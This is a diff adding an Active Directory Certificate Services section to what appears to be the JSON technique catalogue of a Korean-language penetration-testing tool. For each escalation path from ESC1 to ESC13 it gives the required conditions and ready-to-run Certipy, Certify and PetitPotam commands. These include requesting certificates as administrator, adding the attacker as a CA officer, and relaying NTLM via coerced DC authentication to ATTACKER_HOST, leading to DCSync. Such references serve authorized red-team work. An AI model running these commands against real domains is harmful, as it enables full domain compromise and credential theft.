@@ -424,5 +424,105 @@
       "cmd": ["# BloodHound 에서 SIDHistory 대상 그룹 확인 후 접근 경로 평가"],
       "tools": [{"name": "impacket / mimikatz", "type": "py", "url": "https://github.com/fortra/impacket"}]
     }
+  },
+
+  "adcs": {
+    "_note": "AD CS(인증서 서비스) 권한상승은 bloodhound-python 기본 수집에 없으므로 PETS 가 자동탐지하지 못한다. 반드시 Certipy 로 직접 점검할 것. 아래는 ESC1~ESC13 참고 + 악용 명령.",
+    "detect": {
+      "ko": "취약 인증서 템플릿/CA 자동 점검 (가장 먼저 실행)",
+      "cmd": [
+        "certipy find -u attacker@corp.local -p 'Passw0rd!' -dc-ip DC_IP -vulnerable -stdout",
+        "certipy find -u attacker@corp.local -p 'Passw0rd!' -dc-ip DC_IP -enabled -stdout   # 전체 템플릿",
+        "# (Windows) Certify.exe find /vulnerable"
+      ],
+      "tools": [
+        {"name": "Certipy", "type": "py", "url": "https://github.com/ly4k/Certipy"},
+        {"name": "Certify", "type": "exe", "url": "https://github.com/GhostPack/Certify"}
+      ]
+    },
+    "techniques": {
+      "ESC1": {
+        "ko": "요청자 지정 SAN 허용 템플릿 (Enrollee Supplies Subject + Client Auth)",
+        "condition": "저권한 등록 가능 + ENROLLEE_SUPPLIES_SUBJECT + 인증(Client Authentication) EKU",
+        "cmd": [
+          "certipy req -u attacker@corp.local -p 'Passw0rd!' -dc-ip DC_IP -ca CA-NAME -template VULN_TEMPLATE -upn administrator@corp.local",
+          "certipy auth -pfx administrator.pfx -dc-ip DC_IP   # -> TGT + NT 해시"
+        ]
+      },
+      "ESC2": {
+        "ko": "Any Purpose EKU 템플릿",
+        "condition": "Any Purpose(또는 EKU 없음) + 저권한 등록 가능",
+        "cmd": ["certipy req -u attacker@corp.local -p 'Passw0rd!' -ca CA-NAME -template VULN_TEMPLATE -upn administrator@corp.local"]
+      },
+      "ESC3": {
+        "ko": "Enrollment Agent 템플릿 (Certificate Request Agent EKU)",
+        "condition": "등록 대리인 인증서 발급 가능 -> 임의 사용자 대리 등록",
+        "cmd": [
+          "certipy req -u attacker@corp.local -p 'Passw0rd!' -ca CA-NAME -template EnrollAgentTemplate",
+          "certipy req -u attacker@corp.local -p 'Passw0rd!' -ca CA-NAME -template User -on-behalf-of 'CORP\\administrator' -pfx attacker.pfx"
+        ]
+      },
+      "ESC4": {
+        "ko": "템플릿에 대한 쓰기 권한(ACL)",
+        "condition": "저권한 주체가 템플릿 WriteDacl/WriteOwner/GenericAll 보유",
+        "cmd": [
+          "certipy template -u attacker@corp.local -p 'Passw0rd!' -template VULN_TEMPLATE -write-default-configuration   # ESC1 로 변형",
+          "# 이후 ESC1 절차로 administrator 인증서 발급 -> 원복"
+        ]
+      },
+      "ESC5": {
+        "ko": "CA 서버 객체/PKI 객체 ACL 취약",
+        "condition": "CA 컴퓨터 객체나 PKI 컨테이너에 쓰기 권한 -> CA 전체 장악",
+        "cmd": ["# 취약 객체 장악(GenericAll 등) 후 ESC7/ESC6 유도"]
+      },
+      "ESC6": {
+        "ko": "CA 에 EDITF_ATTRIBUTESUBJECTALTNAME2 플래그",
+        "condition": "CA 정책이 요청자 SAN 지정 허용 -> 아무 템플릿으로도 SAN 스푸핑",
+        "cmd": ["certipy req -u attacker@corp.local -p 'Passw0rd!' -ca CA-NAME -template User -upn administrator@corp.local"]
+      },
+      "ESC7": {
+        "ko": "CA 관리 권한 (ManageCA / ManageCertificates)",
+        "condition": "CA 관리자 -> 실패한 요청 승인 또는 EDITF 플래그 설정(ESC6 유도)",
+        "cmd": [
+          "certipy ca -u attacker@corp.local -p 'Passw0rd!' -ca CA-NAME -add-officer attacker",
+          "certipy ca -u attacker@corp.local -p 'Passw0rd!' -ca CA-NAME -enable-template SubCA",
+          "# SubCA 요청 -> 거부 -> officer 로 issue -> retrieve"
+        ]
+      },
+      "ESC8": {
+        "ko": "웹 등록(HTTP) NTLM 릴레이",
+        "condition": "CA 웹 등록 엔드포인트 활성 + NTLM 강제 인증(PetitPotam/PrinterBug)",
+        "cmd": [
+          "certipy relay -target 'http://CA_HOST/certsrv/certfnsh.asp' -template DomainController",
+          "PetitPotam.py -u attacker -p 'Passw0rd!' ATTACKER_HOST DC_HOST   # DC 강제 인증 릴레이",
+          "certipy auth -pfx dc.pfx -dc-ip DC_IP   # -> DC 계정 -> DCSync"
+        ]
+      },
+      "ESC9": {
+        "ko": "No Security Extension (szOID_NTDS_CA_SECURITY_EXT 미포함)",
+        "condition": "템플릿 CT_FLAG_NO_SECURITY_EXTENSION + 대상 계정 UPN 조작 가능",
+        "cmd": ["# 대상 UPN 을 victim 으로 변경 후 인증서 발급 -> victim 으로 인증 (ESC9/10 조합)"]
+      },
+      "ESC10": {
+        "ko": "약한 인증서 매핑 (StrongCertificateBindingEnforcement 완화)",
+        "condition": "DC 레지스트리 약한 매핑 + UPN/altSecID 조작",
+        "cmd": ["certipy shadow auto ...  # 또는 UPN 스푸핑 후 certipy auth"]
+      },
+      "ESC11": {
+        "ko": "IF_ENFORCEENCRYPTICERTREQUEST 미설정 (RPC 릴레이)",
+        "condition": "CA RPC 인터페이스 암호화 미강제 -> ICPR RPC 릴레이",
+        "cmd": ["certipy relay -target 'rpc://CA_HOST' -template DomainController"]
+      },
+      "ESC13": {
+        "ko": "발급 정책 OID 가 그룹에 연결 (Issuance Policy -> Group Link)",
+        "condition": "템플릿의 발급 정책이 특권 그룹에 매핑됨 -> 인증서 획득 시 그룹 권한",
+        "cmd": ["certipy req -u attacker@corp.local -p 'Passw0rd!' -ca CA-NAME -template ESC13_TEMPLATE"]
+      }
+    },
+    "refs": [
+      "https://github.com/ly4k/Certipy",
+      "https://www.thehacker.recipes/ad/movement/adcs/",
+      "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    ]
   }
 }
